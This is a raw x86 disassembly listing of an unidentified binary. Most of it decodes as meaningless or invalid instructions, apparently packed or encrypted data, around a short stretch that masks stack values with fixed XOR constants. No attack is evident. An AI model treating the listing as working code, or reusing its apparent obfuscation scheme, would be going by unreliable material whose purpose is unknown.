  41ebe3:	inc    esi
  41ebe4:	pop    esi
  41ebe5:	repz ds adc dl,dl
  41ebe9:	jg     0x41eb73
  41ebeb:	push   cs
  41ebec:	retf   0xe768
  41ebef:	xor    BYTE PTR ds:[ebx+0x7289dac9],bh
  41ebf6:	cmp    eax,0xf7b0a327
  41ebfb:	in     al,0xbb
  41ebfd:	jne    0x41ec0e
  41ebff:	test   BYTE PTR [esi+0x4],dl
  41ec02:	add    BYTE PTR [eax],al
  41ec04:	mov    eax,DWORD PTR [ebp-0x154]
  41ec0a:	jmp    0x41eff1
  41ec0f:	cld    
  41ec10:	sbb    eax,0x6c1c4604
  41ec15:	mov    esp,0x10e976b3
  41ec1a:	sahf   
  41ec1b:	stos   DWORD PTR es:[edi],eax
  41ec1c:	mov    WORD PTR [esi-0x6e],?
  41ec1f:	xor    esi,DWORD PTR [edi-0x40]
  41ec22:	mov    esi,0xbebec44a
  41ec27:	lahf   
  41ec28:	ret    0xdaa7
  41ec2b:	pop    ss
  41ec2c:	rcr    DWORD PTR [edx-0x7b],1
  41ec2f:	icebp  
  41ec30:	rcl    DWORD PTR [ebp+0x59],0x4b
  41ec34:	pop    ebx
  41ec35:	sub    eax,0x4ff949ad
  41ec3a:	test   BYTE PTR [edx+ecx*4],ch
  41ec3d:	aaa    
  41ec3e:	inc    edi
  41ec3f:	icebp  
  41ec40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec41:	jns    0x41ec46
  41ec43:	test   BYTE PTR [eax+0x3],cl
  41ec46:	pop    ds
  41ec47:	xor    eax,0x75d31f19
  41ec4c:	pop    eax
  41ec4d:	jp     0x41ec0d
  41ec4f:	mov    ds:0x53f32bee,eax
  41ec54:	loope  0x41ec06
  41ec56:	test   al,0x3
  41ec58:	or     al,0xdf
  41ec5a:	sti    
  41ec5b:	leave  
  41ec5c:	dec    edi
  41ec5d:	add    esi,esp
  41ec5f:	cmp    DWORD PTR [edx],edi
  41ec61:	pop    es
  41ec62:	xchg   ecx,eax
  41ec63:	lods   al,BYTE PTR ds:[esi]
  41ec64:	test   DWORD PTR [ebx+0xaadab2c],eax
  41ec6a:	dec    eax
  41ec6b:	inc    ebx
  41ec6c:	out    0xfc,al
  41ec6e:	cmp    edi,DWORD PTR [esi-0x2517cb85]
  41ec74:	and    cl,BYTE PTR [edx+0x649b8959]
  41ec7a:	xchg   BYTE PTR [edi-0x206e6a37],ch
  41ec80:	xchg   esp,esp
  41ec82:	outs   dx,BYTE PTR ds:[esi]
  41ec83:	rcr    BYTE PTR [ebx],0x66
  41ec86:	sbb    DWORD PTR [ecx+esi*8-0x6f],esi
  41ec8a:	push   cs
  41ec8b:	out    0xee,al
  41ec8d:	mov    al,0xa8
  41ec8f:	out    dx,al
  41ec90:	cli    
  41ec91:	loop   0x41ecb6
  41ec93:	test   BYTE PTR [edi-0xe],ah
  41ec96:	xchg   edx,eax
  41ec97:	cli    
  41ec98:	(bad)  
  41ec99:	jo     0x41ec62
  41ec9b:	outs   dx,DWORD PTR fs:[esi]
  41ec9d:	test   eax,edi
  41ec9f:	lock out 0xd1,eax
  41eca2:	xchg   BYTE PTR [ebp-0xf],bh
  41eca5:	xchg   esp,eax
  41eca6:	cld    
  41eca7:	xchg   DWORD PTR [eax],esp
  41eca9:	into   
  41ecaa:	aad    0xe9
  41ecac:	in     eax,0x6d
  41ecae:	jo     0x41ec91
  41ecb0:	aam    0x7e
  41ecb2:	inc    edx
  41ecb3:	pop    ds
  41ecb4:	jbe    0x41ecb4
  41ecb6:	push   ebp
  41ecb7:	inc    edi
  41ecb8:	cdq    
  41ecb9:	inc    edi
  41ecba:	sar    BYTE PTR [ecx],cl
  41ecbc:	or     BYTE PTR [ebp+0x55692a5a],cl
  41ecc2:	mov    esi,DWORD PTR [edx+0x3a]
  41ecc5:	sbb    eax,0x6cb5bd1
  41ecca:	in     al,dx
  41eccb:	dec    ecx
  41eccc:	loop   0x41ec51
  41ecce:	je     0x41eca2
  41ecd0:	je     0x41ed03
  41ecd2:	shl    DWORD PTR [edx],0xee
  41ecd5:	dec    esi
  41ecd6:	dec    ebx
  41ecd7:	push   ecx
  41ecd8:	(bad)  
  41ecd9:	adc    al,0xb1
  41ecdb:	hlt    
  41ecdc:	pop    ecx
  41ecdd:	adc    BYTE PTR [ecx],bh
  41ecdf:	mov    dl,0xda
  41ece1:	call   0x593f:0xe03ccc0e
  41ece8:	outs   dx,BYTE PTR ds:[esi]
  41ece9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecea:	cdq    
  41eceb:	es push esi
  41eced:	stc    
  41ecee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecef:	sbb    dl,bh
  41ecf1:	inc    ecx
  41ecf2:	xchg   edx,eax
  41ecf3:	adc    ebp,DWORD PTR cs:[ecx]
  41ecf6:	push   cs
  41ecf7:	out    dx,eax
  41ecf8:	or     eax,0xad2a1b51
  41ecfd:	daa    
  41ecfe:	js     0x41ed4a
  41ed00:	mov    edi,eax
  41ed02:	inc    ebx
  41ed03:	mov    esi,0x131b11d9
  41ed08:	test   BYTE PTR [ebp-0x7229aaa0],dh
  41ed0e:	or     ebp,DWORD PTR [edx+0x2a]
  41ed11:	xchg   esp,eax
  41ed12:	xor    cl,0xa3
  41ed15:	ss dec edx
  41ed17:	pop    ecx
  41ed18:	mov    ds:0xd2e63d06,al
  41ed1d:	pop    ds
  41ed1e:	xchg   ecx,eax
  41ed1f:	addr16 inc esi
  41ed21:	xchg   esp,eax
  41ed22:	fwait
  41ed23:	inc    ebx
  41ed24:	inc    ebx
  41ed25:	fldenv [ebp-0x120986d]
  41ed2b:	pop    ebx
  41ed2c:	push   0x57b77403
  41ed31:	mov    esi,0x7eeb0d53
  41ed36:	sldt   WORD PTR [ebp+0x79]
  41ed3a:	mov    esp,0xb6f583cf
  41ed3f:	xor    eax,0x544908c4
  41ed44:	mov    al,0xba
  41ed46:	push   es
  41ed47:	ret    
  41ed48:	sub    al,0x55
  41ed4a:	and    cl,ch
  41ed4c:	push   edi
  41ed4d:	jecxz  0x41ed4e
  41ed4f:	fs out 0xa6,eax
  41ed52:	inc    eax
  41ed53:	push   ebp
  41ed54:	xchg   edi,eax
  41ed55:	fwait
  41ed56:	xlat   BYTE PTR ds:[ebx]
  41ed57:	test   BYTE PTR [esi+0x66],dh
  41ed5a:	aaa    
  41ed5b:	push   0x4c
  41ed5d:	or     esp,DWORD PTR [esi+0x4]
  41ed60:	fst    DWORD PTR [edx+0x2473c4e7]
  41ed66:	push   edx
  41ed67:	and    eax,DWORD PTR [esi]
  41ed69:	jmp    0x41ed85
  41ed6b:	pop    edi
  41ed6c:	out    0xcf,eax
  41ed6e:	xor    BYTE PTR [ecx+ecx*1],0x5f
  41ed72:	cmp    cl,dh
  41ed74:	add    bl,dh
  41ed76:	xlat   BYTE PTR ds:[ebx]
  41ed77:	loopne 0x41ed93
  41ed79:	jb     0x41ed44
  41ed7b:	ja     0x41ed24
  41ed7d:	push   ecx
  41ed7e:	mov    fs,WORD PTR ds:[edx+0x70]
  41ed82:	mov    dl,0x4b
  41ed84:	jp     0x41ed5c
  41ed86:	push   ebp
  41ed87:	xchg   ebp,eax
  41ed88:	(bad)  
  41ed89:	sbb    BYTE PTR [eax+edi*8],dl
  41ed8c:	and    eax,DWORD PTR [edi-0x6955c8a6]
  41ed92:	jae    0x41edee
  41ed94:	or     dh,BYTE PTR ds:0xe0a111d7
  41ed9a:	push   ecx
  41ed9b:	xchg   esp,eax
  41ed9c:	xchg   ebx,eax
  41ed9d:	add    al,0xe3
  41ed9f:	int3   
  41eda0:	xchg   edi,eax
  41eda1:	clc    
  41eda2:	mov    esp,eax
  41eda4:	jbe    0x41ed36
  41eda6:	test   eax,0xa96f5079
  41edab:	push   ebx
  41edad:	gs scas eax,DWORD PTR es:[edi]
  41edaf:	lds    ebx,FWORD PTR [esi+0x17]
  41edb2:	gs int 0xf9
  41edb5:	jne    0x41ee18
  41edb7:	mov    bh,0x3d
  41edb9:	xchg   ecx,eax
  41edba:	push   0xffffff97
  41edbc:	std    
  41edbd:	add    esi,ecx
  41edbf:	outs   dx,BYTE PTR ds:[esi]
  41edc0:	pop    edx
  41edc1:	stos   DWORD PTR es:[edi],eax
  41edc2:	(bad)  
  41edc3:	cmp    ah,ah
  41edc5:	(bad)  [esi+0x66]
  41edc8:	mov    dh,0x91
  41edca:	and    al,0x52
  41edcc:	adc    ecx,DWORD PTR [edx]
  41edce:	fimul  WORD PTR [edi+0x38ac9ea9]
  41edd4:	inc    ebx
  41edd5:	dec    edx
  41edd6:	cmp    eax,DWORD PTR [edi+0x15b322c9]
  41eddc:	sub    eax,0x7ab7c86b
  41ede1:	in     eax,0xa9
  41ede3:	inc    ecx
  41ede4:	push   ecx
  41ede5:	test   DWORD PTR [esi+0x12],ebp
  41ede8:	jle    0x41edfe
  41edea:	aam    0x7d
  41edec:	imul   ecx,DWORD PTR [esi],0x28
  41edef:	dec    ecx
  41edf0:	test   al,0x71
  41edf2:	jl     0x41ee56
  41edf4:	push   ds
  41edf5:	pusha  
  41edf6:	push   es
  41edf7:	pop    edx
  41edf8:	stos   BYTE PTR es:[edi],al
  41edf9:	push   ecx
  41edfa:	jmp    0x41ee0f
  41edfc:	sbb    al,0x45
  41edfe:	ins    DWORD PTR es:[edi],dx
  41edff:	fsubr  DWORD PTR [esi]
  41ee01:	fs in  eax,dx
  41ee03:	cs pop es
  41ee05:	fiadd  WORD PTR [edx+0x3b7085ac]
  41ee0b:	xchg   ecx,eax
  41ee0c:	test   DWORD PTR [eax],eax
  41ee0e:	sub    edi,edi
  41ee10:	ret    0x2f91
  41ee13:	jno    0x41ee21
  41ee15:	xchg   DWORD PTR [edi+0x6e],edx
  41ee18:	cmp    BYTE PTR [ebx-0x6f1ec9db],cl
  41ee1e:	jns    0x41ee93
  41ee20:	xchg   BYTE PTR [ebp+0x1fa6784d],cl
  41ee26:	aad    0x50
  41ee28:	push   0x87246bd3
  41ee2d:	cli    
  41ee2e:	jb     0x41ee16
  41ee30:	test   al,0xa4
  41ee32:	dec    esp
  41ee33:	in     eax,dx
  41ee34:	hlt    
  41ee35:	stos   BYTE PTR es:[edi],al
  41ee36:	xor    al,0x50
  41ee38:	xchg   ebx,eax
  41ee39:	mov    esp,0x3e166da6
  41ee3e:	sub    eax,0xac8ab2a3
  41ee43:	inc    edi
  41ee44:	xlat   BYTE PTR ds:[ebx]
  41ee45:	sub    ah,BYTE PTR [ecx+ebx*8]
  41ee48:	cdq    
  41ee49:	ret    
  41ee4a:	es mov ah,0xc
  41ee4d:	xchg   esp,eax
  41ee4e:	mov    esi,0x679e2ea6
  41ee53:	fs ins DWORD PTR es:[edi],dx
  41ee55:	jo     0x41ee0c
  41ee57:	and    eax,0xe34e52a7
  41ee5c:	retf   0xea92
  41ee5f:	or     dl,BYTE PTR [esi+0x379a46c6]
  41ee65:	mov    ch,0x4d
  41ee67:	pop    ss
  41ee68:	retf   0xb2f6
  41ee6b:	sbb    ecx,DWORD PTR [bp-0x70]
  41ee6f:	mov    al,0x54
  41ee71:	imul   DWORD PTR [ebp+0x63]
  41ee74:	sbb    DWORD PTR ds:0x60c5acfd,esi
  41ee7a:	pop    esp
  41ee7b:	jmp    DWORD PTR [esi-0x728eefc]
  41ee81:	es dec edx
  41ee83:	cld    
  41ee84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee85:	ffreep st(4)
  41ee87:	retf   0x41d5
  41ee8a:	inc    edi
  41ee8b:	(bad)  
  41ee8c:	pop    ecx
  41ee8d:	dec    DWORD PTR [esp+ebp*2+0x3f]
  41ee91:	lds    ecx,FWORD PTR [edi]
  41ee93:	xor    cl,BYTE PTR [eax-0x2c4b500d]
  41ee99:	push   edi
  41ee9a:	inc    edi
  41ee9b:	xchg   ebp,eax
  41ee9c:	test   DWORD PTR [ecx],esi
  41ee9e:	jae    0x41ef0e
  41eea0:	shl    DWORD PTR [edx+0x26d606ee],cl
  41eea6:	popa   
  41eea7:	sub    esi,DWORD PTR [eax-0x50b4dfbd]
  41eead:	mov    ebx,0x32b73c73
  41eeb2:	add    BYTE PTR [ebx-0x5a],al
  41eeb5:	cmp    eax,0x8c80eb02
  41eeba:	shl    BYTE PTR [ecx-0x47067450],0x1a
  41eec1:	mov    bh,BYTE PTR [edi-0x43]
  41eec4:	test   ah,ch
  41eec6:	xchg   esi,eax
  41eec7:	stos   DWORD PTR es:[edi],eax
  41eec8:	jae    0x41ef24
  41eeca:	std    
  41eecb:	push   ebx
  41eecc:	sbb    ch,BYTE PTR [eax-0x4ef3bfc3]
  41eed2:	cmp    al,BYTE PTR [ecx+0x3d65311a]
  41eed8:	xor    DWORD PTR [ebx+0x11],ebp
  41eedb:	xlat   BYTE PTR ds:[ebx]
  41eedc:	mov    edx,0xc205e359
  41eee1:	or     eax,DWORD PTR [edi-0x2]
  41eee4:	dec    esp
  41eee5:	or     DWORD PTR [ecx+edx*8+0x58],0xffffff96
  41eeea:	sub    ch,bh
  41eeec:	mov    ecx,DWORD PTR [eax+0x3b]
  41eeef:	dec    esi
  41eef0:	sub    al,0x67
  41eef2:	jne    0x41ef6b
  41eef4:	pop    ecx
  41eef5:	ret    
  41eef6:	scas   eax,DWORD PTR es:[edi]
  41eef7:	arpl   WORD PTR [ebp-0x26c3aca5],sp
  41eefd:	jle    0x41eeef
  41eeff:	sbb    bh,BYTE PTR [esi-0x37b0d713]
  41ef05:	outs   dx,DWORD PTR ds:[esi]
  41ef06:	std    
  41ef07:	dec    ecx
  41ef08:	retf   
  41ef09:	test   dh,bh
  41ef0b:	jae    0x41eecd
  41ef0d:	ins    DWORD PTR es:[edi],dx
  41ef0e:	jns    0x41ef32
  41ef10:	push   0x2b
  41ef12:	outs   dx,BYTE PTR ds:[esi]
  41ef13:	jo     0x41ef42
  41ef15:	stos   BYTE PTR es:[edi],al
  41ef16:	cmp    BYTE PTR [edi],bh
  41ef18:	adc    al,0xaa
  41ef1a:	pop    ds
  41ef1b:	pop    ecx
  41ef1c:	jmp    0xac901165
  41ef21:	adc    BYTE PTR [ebp-0x3b59367d],0x39
  41ef28:	xchg   esi,eax
  41ef29:	dec    eax
  41ef2a:	add    DWORD PTR [esi-0x4b0806eb],ebx
  41ef30:	push   eax
  41ef31:	or     al,0xa2
  41ef33:	daa    
  41ef34:	(bad)  
  41ef35:	popf   
  41ef36:	pop    ebp
  41ef37:	stos   BYTE PTR es:[edi],al
  41ef38:	lea    edi,[ebx-0x6f]
  41ef3b:	xchg   esi,eax
  41ef3c:	jbe    0x41ef35
  41ef3e:	imul   ebx,DWORD PTR [esi],0x72209d5c
  41ef44:	xor    ebx,DWORD PTR [ecx-0x27]
  41ef47:	fidivr WORD PTR [esp+ecx*4+0x1bde6f9a]
  41ef4e:	adc    DWORD PTR [ecx-0x2cadef27],eax
  41ef54:	jno    0x41ef8d
  41ef56:	fwait
  41ef57:	jmp    0xbf5d:0x6ddd7072
  41ef5e:	nop
  41ef5f:	and    dh,bh
  41ef61:	fs xchg ebx,eax
  41ef63:	mov    cl,0xd8
  41ef65:	mov    eax,ds:0x51953c42
  41ef6a:	rcr    DWORD PTR [ebx+0x2],1
  41ef6d:	xor    al,0x10
  41ef6f:	inc    ebp
  41ef70:	inc    esi
  41ef71:	(bad)  
  41ef72:	sbb    bh,BYTE PTR [eax-0x60]
  41ef75:	adc    ch,dl
  41ef77:	and    BYTE PTR [ebp+0x1ef12985],cl
  41ef7d:	retf   0x6e3c
  41ef80:	fstp   QWORD PTR [eax]
  41ef82:	push   0xb359958a
  41ef87:	push   ds
  41ef88:	fcomp  QWORD PTR [edi]
  41ef8a:	les    esp,FWORD PTR [ebx+ecx*2]
  41ef8d:	inc    esi
  41ef8e:	fnstcw WORD PTR [ecx-0x946e709]
  41ef94:	jecxz  0x41efc4
  41ef96:	das    
  41ef97:	push   esi
  41ef98:	jmp    0x55d3a0b4
  41ef9d:	or     bl,bh
  41ef9f:	push   ebx
  41efa0:	dec    edi
  41efa1:	xchg   cx,ax
  41efa3:	xor    BYTE PTR [ecx+ebx*2],0xc8
  41efa7:	loop   0x41efab
  41efa9:	sbb    esp,esi
  41efab:	pop    ss
  41efac:	jae    0x41efe0
  41efae:	mov    esi,0xaa7eaae1
  41efb3:	(bad)  
  41efb4:	loopne 0x41ef85
  41efb6:	mov    esp,0x58367dc4
  41efbb:	cmp    BYTE PTR [ecx-0xa112ae2],bh
  41efc1:	shr    DWORD PTR [ebx+edx*1-0x4f],1
  41efc5:	and    BYTE PTR [ecx+0x16],bl
  41efc8:	adc    DWORD PTR [edi],esp
  41efca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efcb:	shl    DWORD PTR [edx+0x4a7b45c],0xc
  41efd2:	cmp    DWORD PTR [eax],0x2f
  41efd5:	(bad)  
  41efd6:	std    
  41efd7:	pop    esi
  41efd8:	adc    eax,0xf2138dad
  41efdd:	(bad)  
  41efde:	test   al,0x9f
  41efe0:	test   al,0x41
  41efe2:	js     0x41f053
  41efe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efe5:	push   es
  41efe6:	int3   
  41efe7:	add    ebx,esp
  41efe9:	pavgw  mm0,QWORD PTR [edx-0x2d748b6b]
  41eff0:	mov    dx,WORD PTR [ebp-0x150]
  41eff7:	xor    eax,0xcb79b576
  41effc:	xor    edx,0x9c2b8ae8
  41f002:	mov    cl,0x2
  41f004:	call   0x408bb8
  41f009:	mov    esi,eax
  41f00b:	mov    edi,edx
  41f00d:	mov    eax,DWORD PTR [ebp-0x154]
  41f013:	mov    edx,DWORD PTR [ebp-0x150]
  41f019:	xor    eax,0xcb79b576
  41f01e:	xor    edx,0x9c2b8ae8
  41f024:	mov    cl,0x3e
  41f026:	call   0x4223e0
  41f02b:	or     esi,eax
  41f02d:	or     edi,edx
  41f02f:	mov    eax,DWORD PTR [ebp-0x160]
  41f035:	imul   esi,eax
  41f038:	add    esi,DWORD PTR [ebp-0x170]
  41f03e:	mov    DWORD PTR [ebp-0x16c],esi
  41f044:	mov    eax,DWORD PTR [ebp-0x16c]
  41f04a:	mov    DWORD PTR [ebp-0x178],eax
  41f050:	jmp    0x41f19e
  41f055:	jmp    0x41f105
  41f05a:	mov    eax,DWORD PTR [ebp-0x154]
  41f060:	mov    edx,DWORD PTR [ebp-0x150]
  41f066:	xor    eax,0xcb79b576
  41f06b:	xor    edx,0x9c2b8ae8
  41f071:	mov    cl,0x2
  41f073:	call   0x408bb8
  41f078:	mov    esi,eax
  41f07a:	mov    edi,edx
  41f07c:	mov    eax,DWORD PTR [ebp-0x154]
  41f082:	mov    edx,DWORD PTR [ebp-0x150]
  41f088:	xor    eax,0xcb79b576
  41f08d:	xor    edx,0x9c2b8ae8
  41f093:	mov    cl,0x3e
  41f095:	call   0x4223e0
  41f09a:	or     esi,eax
  41f09c:	or     edi,edx
  41f09e:	mov    eax,DWORD PTR [ebp-0x15c]
  41f0a4:	mov    edx,DWORD PTR [ebp-0x158]
  41f0aa:	xor    eax,0xcb79b576
  41f0af:	xor    edx,0x9c2b8ae8
  41f0b5:	mov    cl,0x2
  41f0b7:	call   0x408bb8
  41f0bc:	mov    ebx,eax
  41f0be:	mov    eax,edx
  41f0c0:	mov    ecx,DWORD PTR [ebp-0x15c]
  41f0c6:	mov    edx,DWORD PTR [ebp-0x158]
  41f0cc:	xor    ecx,0xcb79b576
  41f0d2:	xor    edx,0x9c2b8ae8
  41f0d8:	mov    DWORD PTR [ebp-0x234],eax
  41f0de:	mov    eax,ecx
  41f0e0:	mov    cl,0x3e
  41f0e2:	call   0x4223e0
  41f0e7:	or     ebx,eax
  41f0e9:	mov    eax,DWORD PTR [ebp-0x234]
  41f0ef:	or     eax,edx
  41f0f1:	push   eax
  41f0f2:	push   ebx
  41f0f3:	push   edi
  41f0f4:	push   esi
  41f0f5:	call   0x41594e
  41f0fa:	mov    DWORD PTR [ebp-0x178],eax
  41f100:	jmp    0x41f19e
  41f105:	mov    eax,DWORD PTR [ebp-0x15c]
  41f10b:	mov    edx,DWORD PTR [ebp-0x158]
  41f111:	xor    eax,0xcb79b576
  41f116:	xor    edx,0x9c2b8ae8
  41f11c:	mov    cl,0x2
  41f11e:	call   0x408bb8
  41f123:	mov    esi,eax
  41f125:	mov    edi,edx
  41f127:	mov    eax,DWORD PTR [ebp-0x15c]
  41f12d:	mov    edx,DWORD PTR [ebp-0x158]
  41f133:	xor    eax,0xcb79b576
  41f138:	xor    edx,0x9c2b8ae8
  41f13e:	mov    cl,0x3e
  41f140:	call   0x4223e0
  41f145:	or     esi,eax
  41f147:	or     edi,edx
  41f149:	mov    DWORD PTR [ebp-0x178],esi
  41f14f:	jmp    0x41f19e
  41f154:	mov    eax,DWORD PTR [ebp-0x15c]
  41f15a:	mov    edx,DWORD PTR [ebp-0x158]
  41f160:	xor    eax,0xcb79b576
  41f165:	xor    edx,0x9c2b8ae8
  41f16b:	mov    cl,0x2
  41f16d:	call   0x408bb8
  41f172:	mov    esi,eax
  41f174:	mov    edi,edx
  41f176:	mov    eax,DWORD PTR [ebp-0x15c]
  41f17c:	mov    edx,DWORD PTR [ebp-0x158]
  41f182:	xor    eax,0xcb79b576
  41f187:	xor    edx,0x9c2b8ae8
  41f18d:	mov    cl,0x3e
  41f18f:	call   0x4223e0
  41f194:	or     esi,eax
  41f196:	or     edi,edx
  41f198:	mov    DWORD PTR [ebp-0x178],esi
  41f19e:	mov    ecx,DWORD PTR [ebp-0xd8]
  41f1a4:	mov    eax,0x459a
  41f1a9:	xor    edx,edx
  41f1ab:	div    ecx
  41f1ad:	jmp    0x41f594
  41f1b2:	push   edx
  41f1b3:	inc    ebx
  41f1b4:	sbb    eax,0xbcab304b
  41f1b9:	pop    esp
  41f1ba:	or     edi,DWORD PTR [edx]
  41f1bc:	cld    
  41f1bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1be:	push   0xfffffffa
  41f1c0:	inc    edx
  41f1c1:	ffree  st(0)
  41f1c3:	jg     0x41f185
  41f1c5:	mov    esi,0xbebec44a
  41f1ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1cb:	xchg   dh,dl
  41f1cd:	mov    bh,BYTE PTR [ebp-0x4d]
  41f1d0:	ja     0x41f1f7
  41f1d2:	cmp    ah,BYTE PTR [edi+0x63]
  41f1d5:	sbb    ecx,DWORD PTR [edx-0x6fcd79fb]
  41f1db:	mov    ch,0x36
  41f1dd:	icebp  
  41f1de:	mov    cl,0x3d
  41f1e0:	or     dh,cl
  41f1e2:	mov    bl,cl
  41f1e4:	pop    esi
  41f1e5:	jmp    0x9e1bed08
  41f1ea:	not    ah
  41f1ec:	sbb    ebx,ecx
  41f1ee:	cmp    eax,0xe72c7473
  41f1f3:	retf   
  41f1f4:	mov    al,ds:0xfb9f832b
  41f1f9:	fbld   TBYTE PTR [ecx+0x2b]
  41f1fc:	stc    
  41f1fd:	or     al,0xaf
  41f1ff:	cmp    cl,dh
  41f201:	push   ss
  41f202:	mov    BYTE PTR [edi+0x18],ah
  41f205:	(bad)  
  41f206:	fstp   TBYTE PTR [edx]
  41f208:	xlat   BYTE PTR ds:[ebx]
  41f209:	(bad)
  41f20c:	popf   
  41f20d:	dec    esp
  41f20e:	out    dx,eax
  41f20f:	aaa    
  41f210:	jb     0x41f1f7
  41f212:	mov    edi,0x38349dde
  41f217:	mov    bl,0xb0
  41f219:	xor    eax,0x8552030f
  41f21e:	jnp    0x41f1f8
  41f220:	repnz mov al,0x0
  41f223:	js     0x41f223
  41f225:	(bad)  
  41f226:	stos   DWORD PTR es:[edi],eax
  41f227:	mov    ebp,0xee9cc763
  41f22c:	mov    ebp,0x200f7ccf
  41f231:	mov    al,BYTE PTR [edx+0x22269163]
  41f237:	sub    WORD PTR [edx-0x33],dx
  41f23b:	inc    ebp
  41f23c:	jae    0x41f263
  41f23e:	add    BYTE PTR [ebp-0x4c],bl
  41f241:	(bad)  
  41f242:	sbb    bl,ah
  41f244:	xor    BYTE PTR [ebp-0x19],ah
  41f247:	add    dh,BYTE PTR [edi]
  41f249:	dec    ebp
  41f24a:	daa    
  41f24b:	xor    eax,0xf689e8d5
  41f250:	test   BYTE PTR [ebp+0x53cb89ae],bl
  41f256:	sbb    BYTE PTR [eax],cl
  41f258:	es push cs
  41f25a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f25b:	aas    
  41f25c:	in     eax,dx
  41f25d:	fnstcw WORD PTR [edi+0x46a97098]
  41f263:	and    edi,DWORD PTR [ebx*8-0x4d71681b]
  41f26a:	jo     0x41f2a3
  41f26c:	fldcw  WORD PTR [eax-0x29ed398f]
  41f272:	jns    0x41f282
  41f274:	inc    esp
  41f275:	inc    edi
  41f276:	mov    BYTE PTR [ebx],ah
  41f278:	xor    eax,0xf8b524e9
  41f27d:	lods   eax,DWORD PTR ds:[esi]
  41f27e:	jecxz  0x41f2ad
  41f280:	(bad)  
  41f281:	sti    
  41f282:	mov    ah,0xdd
  41f284:	push   esi
  41f285:	jge    0x41f2ba
  41f287:	sub    eax,0x3ea1df36
  41f28c:	fld    st(4)
  41f28e:	pushf  
  41f28f:	xchg   ecx,eax
  41f290:	lock call 0xddd8:0xc8629311
  41f298:	pop    esi
  41f299:	push   eax
  41f29a:	enter  0x770d,0x8c
  41f29e:	push   ebx
  41f29f:	sahf   
  41f2a0:	not    BYTE PTR [eax+0x7b7e61f6]
  41f2a6:	lods   eax,DWORD PTR cs:[esi]
  41f2a8:	(bad)  
  41f2a9:	out    0xa5,eax
  41f2ab:	call   0x8f9b:0xe95e1ecf
  41f2b2:	mov    al,0xca
  41f2b4:	arpl   bp,sp
  41f2b6:	adc    edx,DWORD PTR [esi]
  41f2b8:	scas   al,BYTE PTR es:[edi]
  41f2b9:	push   edi
  41f2ba:	stos   BYTE PTR es:[edi],al
  41f2bb:	or     ah,BYTE PTR [ecx-0x56]
  41f2be:	sbb    eax,0xb91502dd
  41f2c3:	out    dx,eax
  41f2c4:	mov    eax,ds:0x81c205c
  41f2c9:	fsub   QWORD PTR [edx+0x7bd9fe9d]
  41f2cf:	fwait
  41f2d0:	pop    esi
  41f2d1:	jae    0x41f31c
  41f2d3:	out    dx,eax
  41f2d4:	not    DWORD PTR [edi]
  41f2d6:	jb     0x41f33d
  41f2d8:	and    eax,0x631f7ae7
  41f2dd:	jbe    0x41f358
  41f2df:	sti    
  41f2e0:	test   DWORD PTR [ecx-0xa812bba],ecx
  41f2e6:	mov    esi,DWORD PTR [ecx-0xf]
  41f2e9:	xchg   esp,eax
  41f2ea:	es or  esp,edi
  41f2ed:	into   
  41f2ee:	dec    edi
  41f2ef:	shr    bh,cl
  41f2f1:	sub    edx,DWORD PTR [eax+0x3f2d8cd0]
  41f2f7:	pop    edx
  41f2f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2f9:	pusha  
  41f2fa:	std    
  41f2fb:	inc    esi
  41f2fc:	sbb    eax,0x89ad649e
  41f301:	inc    ebp
  41f302:	ret    0xdf5b
  41f305:	sahf   
  41f306:	adc    eax,0xfd0d5688
  41f30b:	and    DWORD PTR [edx],edx
  41f30d:	cli    
  41f30e:	push   edi
  41f30f:	adc    dh,dh
  41f311:	repz mov eax,0x6d5771c6
  41f317:	inc    ebp
  41f318:	lea    ebp,[ecx+0x3c639a47]
  41f31e:	push   ebx
  41f31f:	dec    ebx
  41f320:	aaa    
  41f321:	test   BYTE PTR fs:[eax+0x3d],ch
  41f325:	lahf   
  41f326:	(bad)  
  41f327:	dec    edi
  41f328:	aad    0x4b
  41f32a:	loop   0x41f2c7
  41f32c:	pop    ecx
  41f32d:	mov    edx,ebx
  41f32f:	pop    esp
  41f330:	ret    
  41f331:	mul    esi
  41f333:	dec    esp
  41f334:	mov    bl,BYTE PTR [ebp-0x77]
  41f337:	scas   eax,DWORD PTR es:[edi]
  41f338:	cwde   
  41f339:	dec    ebp
  41f33a:	mov    edi,DWORD PTR [edx]
  41f33c:	dec    ecx
  41f33d:	lahf   
  41f33e:	int    0x34
  41f340:	scas   eax,DWORD PTR es:[edi]
  41f341:	sbb    ah,BYTE PTR [ebp+0x49d3f5b0]
  41f347:	push   esi
  41f348:	(bad)  
  41f349:	lea    esp,[esi]
  41f34b:	adc    ah,BYTE PTR [esi+0x6e]
  41f34e:	int    0xc3
  41f350:	mov    ch,0xb7
  41f352:	hlt    
  41f353:	arpl   WORD PTR [esp+ebx*4-0x40e2aa74],cx
  41f35a:	push   ds
  41f35b:	or     bh,bl
  41f35d:	test   eax,0xc9f4e8e2
  41f362:	push   es
  41f363:	push   ss
  41f364:	cmc    
  41f365:	popf   
  41f366:	dec    edx
  41f367:	add    BYTE PTR [ebx+0x29],dl
  41f36a:	xor    dh,dl
  41f36c:	dec    edi
  41f36d:	pop    ecx
  41f36e:	into   
  41f36f:	mov    esi,0x7a9cb3a3
  41f374:	mov    dl,0x1a
  41f376:	or     ah,ch
  41f378:	sbb    eax,0x708a9480
  41f37d:	jmp    0xa77d:0xa958970c
  41f384:	xchg   esi,eax
  41f385:	and    DWORD PTR [ecx-0x1],ebp
  41f388:	repnz xchg ebx,eax
  41f38a:	cmp    BYTE PTR [edx+0x3e],bh
  41f38d:	enter  0x48fb,0x8e
  41f391:	pop    ecx
  41f392:	and    eax,0x21a30324
  41f397:	mov    dl,BYTE PTR [edi+0x2e6c056c]
  41f39d:	mov    ecx,0xa243976b
  41f3a2:	int    0x40
  41f3a4:	arpl   WORD PTR [ebx-0x52],dx
  41f3a7:	pusha  
  41f3a8:	test   DWORD PTR [edi+0x18d46e7f],esi
